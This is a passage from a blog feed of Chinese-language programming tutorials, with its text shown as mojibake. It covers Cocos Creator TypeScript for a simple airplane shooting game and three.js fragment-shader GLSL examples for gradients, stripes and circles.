Touch &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; GameManager &#125; <span class="keyword">from</span> <span class="string">'./GameManager'</span></span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'UIManager'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">UIManager</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    @property(GameManager)</span><br><span class="line">    public gameManager:GameManager = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    @property(Node)</span><br><span class="line">    public player: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    public playerSpeed = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    start() &#123;</span><br><span class="line">      <span class="comment">// æ§åˆ¶ç©å®¶é£æœºç§»åŠ¨</span></span><br><span class="line">      input.on(Input.EventType.TOUCH_START, <span class="keyword">this</span>._touchStart, <span class="keyword">this</span>)</span><br><span class="line">      input.on(Input.EventType.TOUCH_MOVE, <span class="keyword">this</span>._touchMove, <span class="keyword">this</span>)</span><br><span class="line">      input.on(Input.EventType.TOUCH_END, <span class="keyword">this</span>._touchEnd, <span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _touchStart() &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.gameManager.isGameStart) &#123;</span><br><span class="line">        <span class="keyword">this</span>.gameManager.setIsShooting(<span class="literal">true</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _touchMove(touch: Touch) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.gameManager.isGameStart) <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">const</span> delta = touch.getDelta()</span><br><span class="line">      <span class="keyword">const</span> pos = <span class="keyword">this</span>.player.position</span><br><span class="line">      <span class="keyword">this</span>.player.setPosition(</span><br><span class="line">        pos.x + <span class="number">0.015</span> * <span class="keyword">this</span>.playerSpeed * delta.x,</span><br><span class="line">        pos.y,</span><br><span class="line">        pos.z - <span class="number">0.015</span> * <span class="keyword">this</span>.playerSpeed * delta.y</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _touchEnd() &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.gameManager.isGameStart) <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">this</span>.gameManager.setIsShooting(<span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-gameMain-ts-æ¸¸æˆä¸»é€»è¾‘"><a href="#3-2-gameMain-ts-æ¸¸æˆä¸»é€»è¾‘" class="headerlink" title="3.2 gameMain.ts æ¸¸æˆä¸»é€»è¾‘"></a>3.2 gameMain.ts æ¸¸æˆä¸»é€»è¾‘</h4><p>åˆ›å»ºè„šæœ¬<code>gameMain.ts</code>ç”¨æ¥å¤„ç†æ¸¸æˆä¸»é€»è¾‘ï¼ŒæŒ‚è½½åˆ°sceneä¸‹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node, Prefab, instantiate, director &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Player &#125; <span class="keyword">from</span> <span class="string">'../Player'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'GameManager'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">GameManager</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="comment">// player</span></span><br><span class="line">    @property(Node)</span><br><span class="line">    public player: Player = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// bullet</span></span><br><span class="line">    @property(Prefab)</span><br><span class="line">    public bullet01: Prefab = <span class="literal">null</span></span><br><span class="line">    <span class="comment">// enemy</span></span><br><span class="line">    @property(Prefab)</span><br><span class="line">    public enemy: Prefab = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    @property(Node)</span><br><span class="line">    bulletRoot: Node = <span class="literal">null</span></span><br><span class="line">    @property(Node)</span><br><span class="line">    enemyRoot: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    public isGameStart = <span class="literal">true</span></span><br><span class="line">    private _isShooting = <span class="literal">false</span></span><br><span class="line">    private _shootTime = <span class="number">0.3</span> <span class="comment">// æ¯0.3så‘å°„ä¸€æ¬¡å­å¼¹</span></span><br><span class="line">    private _curShootingTime = <span class="number">0.4</span> <span class="comment">// è·ç¦»ä¸Šæ¬¡å‘å°„çš„æ—¶é—´</span></span><br><span class="line">    private _enemyTime = <span class="number">3</span> <span class="comment">// æ¯0.5sæ–°å¢ä¸€æ¬¡æ•Œæœº</span></span><br><span class="line">    private _curEnemyTime = <span class="number">0</span> <span class="comment">// è·ç¦»ä¸Šæ¬¡æ•Œæœºå‡ºç°çš„æ—¶é—´</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private _init() &#123;</span><br><span class="line">        <span class="keyword">this</span>.player.init()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    start() &#123;</span><br><span class="line">        <span class="keyword">this</span>.createEnemy(<span class="number">4</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update(deltaTime: number) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.isGameStart) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç©å®¶é£æœºå‘å°„å­å¼¹</span></span><br><span class="line">        <span class="keyword">this</span>.createPlayerBullet(deltaTime)</span><br><span class="line">       </span><br><span class="line">        <span class="comment">// å‡ºç°æ•Œæœº</span></span><br><span class="line">        <span class="keyword">this</span>.createEnemy(deltaTime)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç©å®¶é£æœºæŒç»­å‘å°„å­å¼¹</span></span><br><span class="line">    private createPlayerBullet(deltaTime: number) &#123;</span><br><span class="line">      <span class="keyword">this</span>._curShootingTime += deltaTime</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._isShooting &amp;&amp; <span class="keyword">this</span>._curShootingTime &gt; <span class="keyword">this</span>._shootTime) &#123;</span><br><span class="line">        <span class="keyword">const</span> pos = <span class="keyword">this</span>.player.position;</span><br><span class="line">        <span class="keyword">const</span> bullet = instantiate(<span class="keyword">this</span>.bullet01)</span><br><span class="line">        bullet.setParent(<span class="keyword">this</span>.bulletRoot)</span><br><span class="line">        bullet.setPosition(pos.x, <span class="number">1</span>, pos.z - <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">this</span>._curShootingTime = <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¢åŠ æ•Œæœº</span></span><br><span class="line">    private createEnemy(deltaTime: number) &#123;</span><br><span class="line">      <span class="keyword">this</span>._curEnemyTime += deltaTime</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._curEnemyTime &gt; <span class="keyword">this</span>._enemyTime) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">const</span> elem = instantiate(<span class="keyword">this</span>.enemy)</span><br><span class="line">          elem.setParent(<span class="keyword">this</span>.enemyRoot)</span><br><span class="line">          elem.setPosition(<span class="number">-3.5</span> + <span class="number">2</span> * i, <span class="number">1</span>, <span class="number">-10</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>._curEnemyTime = <span class="number">0</span></span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public setIsShooting(value: boolean) &#123;</span><br><span class="line">      <span class="keyword">this</span>._isShooting = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-å…¶ä»–"><a href="#4-å…¶ä»–" class="headerlink" title="4. å…¶ä»–"></a>4. å…¶ä»–</h3><h4 id="4-1-å…³å¡åˆ‡æ¢"><a href="#4-1-å…³å¡åˆ‡æ¢" class="headerlink" title="4.1 å…³å¡åˆ‡æ¢"></a>4.1 å…³å¡åˆ‡æ¢</h4><p>ä¿å­˜å½“å‰åœºæ™¯ä¸ºlv1.sceneï¼Œåœ¨Asseté‡Œå¤åˆ¶è¯¥åœºæ™¯ï¼Œç²˜è´´ä¸ºlv2.scene, lv3.sceneã€‚åœ¨é€‚å½“æ—¶å€™è°ƒç”¨</p><ul><li><em><code>director.loadScene(&#39;lv2&#39;)</code></em> åˆ‡æ¢å…³å¡</li><li><em><code>director.loadScene(director.getScene().name)</code></em> é‡æ–°åŠ è½½å½“å‰å…³å¡</li></ul><p><br></p><h4 id="4-2-å¼€å§‹ç•Œé¢"><a href="#4-2-å¼€å§‹ç•Œé¢" class="headerlink" title="4.2 å¼€å§‹ç•Œé¢"></a>4.2 å¼€å§‹ç•Œé¢</h4><ul><li>create UIç»„ä»¶ button - Labelâ€ç‚¹å‡»å±å¹•å¼€å§‹â€ - åœºæ™¯ç¼–è¾‘å™¨åˆ‡æ¢2Dæ¨¡å¼ - content size: 2048 * 2048 - color è®¾ç½®ä¸ºåŠé€æ˜é»‘ï¼ˆè’™å±‚æ•ˆæœï¼‰ - ç‚¹å‡»canvasä¸‹çš„cameraå¯ä»¥çœ‹åˆ°æ–‡å­—æ•ˆæœ</li><li>æ–°å»º<code>start.ts</code> - å…³è”åˆ°buttonä¸Šï¼Œè®¾ç½®ç‚¹å‡»å±å¹•æ—¶ï¼Œè’™å±‚æ¶ˆå¤±æ•ˆæœ</li><li>è®¾ç½®click Eventsï¼š Buttonç»„ä»¶, start, onBtnClick<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">start</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  onBtnClick() &#123;</span><br><span class="line">    <span class="keyword">this</span>.node.active = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-3-æ‘„åƒæœºè·Ÿéš"><a href="#4-3-æ‘„åƒæœºè·Ÿéš" class="headerlink" title="4.3 æ‘„åƒæœºè·Ÿéš"></a>4.3 æ‘„åƒæœºè·Ÿéš</h4><p>é€‚åˆè·‘é…·æ¸¸æˆï¼Œæ–°å»ºä¸€ä¸ª<code>followTarget.ts</code>, æŒ‚è½½åœ¨<em><code>Main Camera</code></em>ä¸Š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@ccclass(<span class="string">'FollowTarget'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">FollowTarget</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  @property(Node)</span><br><span class="line">  player: Node;</span><br><span class="line"></span><br><span class="line">  offset = <span class="keyword">new</span> Vec3(<span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>) <span class="comment">// cameraåº”è¯¥åœ¨ç©å®¶çš„åä¸Šæ–¹</span></span><br><span class="line">  tmpPos = <span class="keyword">new</span> Vec3()</span><br><span class="line">  </span><br><span class="line">  update() &#123;</span><br><span class="line">    <span class="keyword">this</span>.player.getPosition(<span class="keyword">this</span>.tmpPos) <span class="comment">// å°†this.player.positionä¼ å…¥this.tmpPoså‘é‡ä¸­</span></span><br><span class="line">    <span class="keyword">this</span>.tmpPos.add(<span class="keyword">this</span>.offset) <span class="comment">// å åŠ ä¸€å®šè·ç¦»ï¼Œè®¾ç½®camera positionå®ç°è·Ÿéš</span></span><br><span class="line">    <span class="keyword">this</span>.node.position = <span class="keyword">this</span>.tmpPos</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="">b ç«™ - Cocos å¼•æ“å®˜æ–¹ - åšä¸€æ¬¾ç»å…¸å°„å‡»æ¸¸æˆ</a></li><li><a href="https://www.bilibili.com/video/BV1Qt4y1c7Wu?spm_id_from=333.788.videopod.sections&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9" target="_blank" rel="noopener">éº’éºŸå­MrKylin - é›¶åŸºç¡€æ¸¸æˆå¼€å‘æ–°æ‰‹å…¥é—¨æ•™ç¨‹</a></li><li><a href="https://github.com/cocos-creator/tutorial-airplane" target="_blank" rel="noopener">é¹°å‡»é•¿ç©º-ä»£ç ä»“åº“</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shaderç‰‡å…ƒç€è‰²å™¨</title>
      <link href="/2024/12/04/threejs-%E7%89%87%E5%85%83%E7%9D%80%E8%89%B2%E5%99%A8/"/>
      <url>/2024/12/04/threejs-%E7%89%87%E5%85%83%E7%9D%80%E8%89%B2%E5%99%A8/</url>
      <content type="html"><![CDATA[<blockquote><p><code>uv</code>æ˜¯æ¯ä¸ªç‰‡å…ƒçš„æ•°å€¼ï¼Œå·¦ä¸‹è§’ vUv ä¸º (0.0, 0.0) æ‰€ä»¥å¯¹åº”çš„ vUv.x=vUv.y=0.0ã€‚åŒç†å·¦ä¸Šè§’å°±æ˜¯ (0.0, 1.0)ã€å³ä¸‹è§’ (1.0, 0.0)ã€å³ä¸Šè§’ (1.0, 1.0)ã€æœ€ä¸­é—´ (0.5, 0.5)ã€‚*</p></blockquote><h3 id="1-é¢œè‰²æ•ˆæœ"><a href="#1-é¢œè‰²æ•ˆæœ" class="headerlink" title="1. é¢œè‰²æ•ˆæœ"></a>1. é¢œè‰²æ•ˆæœ</h3><h4 id="1-1-é¢œè‰²æ¸å˜"><a href="#1-1-é¢œè‰²æ¸å˜" class="headerlink" title="1.1 é¢œè‰²æ¸å˜"></a>1.1 é¢œè‰²æ¸å˜</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  gl_FragColor = vec4(vUv.x, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-é¢œè‰²çªå˜"><a href="#1-2-é¢œè‰²çªå˜" class="headerlink" title="1.2 é¢œè‰²çªå˜"></a>1.2 é¢œè‰²çªå˜</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">float color = step(<span class="number">0.5</span>, vUv.x); <span class="comment">// æ”¹æˆ0.3, çªå˜çš„ä½ç½®ä¹Ÿä¼šéšä¹‹æ”¹å˜</span></span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="1-3-ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ"><a href="#1-3-ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ" class="headerlink" title="1.3 ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ"></a>1.3 ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gl_FragColor = vec4(vUv, <span class="number">0.0</span>, <span class="number">1.0</span>); <span class="comment">// é’çº¢</span></span><br><span class="line">gl_FragColor = vec4(vUv, <span class="number">1.0</span>, <span class="number">1.0</span>); <span class="comment">// è“ç²‰</span></span><br></pre></td></tr></table></figure><h4 id="1-4-æ¡çº¹æ•ˆæœ"><a href="#1-4-æ¡çº¹æ•ˆæœ" class="headerlink" title="1.4 æ¡çº¹æ•ˆæœ"></a>1.4 æ¡çº¹æ•ˆæœ</h4><p>é‡å¤æ¡çº¹æ•ˆæœè¦ç”¨<code>fract</code>ï¼Œè¿”å›x.floor() - xçš„å€¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å–vUv.x * 3.0å°æ•°ï¼Œ&lt; 0.5è¿”å›0ï¼Œ&gt;0.5è¿”å›1</span></span><br><span class="line">float color = step(<span class="number">0.5</span>, fract(vUv.x * <span class="number">3.0</span>))</span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure></p><h4 id="1-5-æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ"><a href="#1-5-æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ" class="headerlink" title="1.5 æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ"></a>1.5 æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>); <span class="comment">// é»„è‰²</span></span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); <span class="comment">// é’è‰²</span></span><br><span class="line">float mixer = vUv.x; <span class="comment">// æ¸å˜</span></span><br><span class="line"><span class="comment">// float mixer = step(0.5, vUv.x); // çªå˜</span></span><br><span class="line"><span class="comment">// float mixer = fract(vUv.x * 3.0); // é‡å¤æ¸å˜</span></span><br><span class="line"><span class="comment">// float mixer = step(0.5, fract(vUv.x * 3.0)); // æ¡çº¹</span></span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-ç»˜åˆ¶å›¾å½¢"><a href="#2-ç»˜åˆ¶å›¾å½¢" class="headerlink" title="2. ç»˜åˆ¶å›¾å½¢"></a>2. ç»˜åˆ¶å›¾å½¢</h3><h4 id="2-1-åœ†å½¢"><a href="#2-1-åœ†å½¢" class="headerlink" title="2.1 åœ†å½¢"></a>2.1 åœ†å½¢</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">float dist = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// å°†æ•´ä½“åæ ‡ç§»åˆ°æ­£ä¸­å¿ƒ</span></span><br><span class="line">float radius = <span class="number">0.5</span>;</span><br><span class="line">float color = step(radius, dist);</span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-2-åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"><a href="#2-2-åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†" class="headerlink" title="2.2 åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"></a>2.2 åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  float dist = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// å°†æ•´ä½“åæ ‡ç§»åˆ°æ­£ä¸­å¿ƒ</span></span><br><span class="line">  float radius = <span class="number">0.5</span> * (sin(uTime) * <span class="number">0.5</span> + <span class="number">0.5</span>);</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"><a href="#2-3-ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†" class="headerlink" title="2.3 ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"></a>2.3 ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  <span class="comment">// å…ˆé‡å¤ uvï¼Œå†å±…ä¸­ï¼Œå†ç»˜åˆ¶åœ†å½¢</span></span><br><span class="line">  float dist = length(fract(vUv * <span class="number">5.0</span>) - vec2(<span class="number">0.5</span>));</span><br><span class="line">  <span class="comment">// åŠå¾„å¤§å°éšæ—¶é—´å‘¨æœŸå˜åŒ–</span></span><br><span class="line">  float radius = <span class="number">0.5</span> * (sin(uTime + vUv.x + vUv.y) * <span class="number">0.5</span> + <span class="number">0.5</span>);</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-å¾„å‘æ¡çº¹-åŠ¨ç”»"><a href="#2-4-å¾„å‘æ¡çº¹-åŠ¨ç”»" class="headerlink" title="2.4 å¾„å‘æ¡çº¹(åŠ¨ç”»)"></a>2.4 å¾„å‘æ¡çº¹(åŠ¨ç”»)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  <span class="comment">// å…ˆå±…ä¸­ï¼Œåé‡å¤ï¼Œå†ç»˜åˆ¶åœ†å½¢</span></span><br><span class="line">  float dist = fract(length(vUv - vec2(<span class="number">0.5</span>)) * <span class="number">5.0</span>);</span><br><span class="line">  <span class="comment">// åŠ¨ç”»æ•ˆæœ</span></span><br><span class="line">  <span class="comment">// float dist = fract((length(vUv - vec2(0.5)) /0.707 - uTime * 0.5) * 5.0);</span></span><br><span class="line">  float radius = <span class="number">0.5</span>;</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-5-æŒ‡å®šé¢œè‰²çš„åœ†å½¢"><a href="#2-5-æŒ‡å®šé¢œè‰²çš„åœ†å½¢" class="headerlink" title="2.5 æŒ‡å®šé¢œè‰²çš„åœ†å½¢"></a>2.5 æŒ‡å®šé¢œè‰²çš„åœ†å½¢</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); </span><br><span class="line">float mixer = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// åœ†å½¢æ¸å˜</span></span><br><span class="line"><span class="comment">// mixer = step(0.25, mixer); // åœ†å½¢</span></span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-6-å¯¹è§’çº¿æ¸å˜"><a href="#2-6-å¯¹è§’çº¿æ¸å˜" class="headerlink" title="2.6 å¯¹è§’çº¿æ¸å˜"></a>2.6 å¯¹è§’çº¿æ¸å˜</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); </span><br><span class="line">float mixer = (vUv.x + vUv.y) / <span class="number">2.0</span>;</span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line"><span class="comment">// mixer = step(0.5, mixer); // å¯¹è§’çº¿çªå˜</span></span><br><span class="line"><span class="comment">// vec3 color = vec3(mixer); // é»‘ç™½æ¸å˜</span></span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-7-æ£‹ç›˜æ ¼"><a href="#2-7-æ£‹ç›˜æ ¼" class="headerlink" title="2.7 æ£‹ç›˜æ ¼"></a>2.7 æ£‹ç›˜æ ¼</h4><figure class="highlight 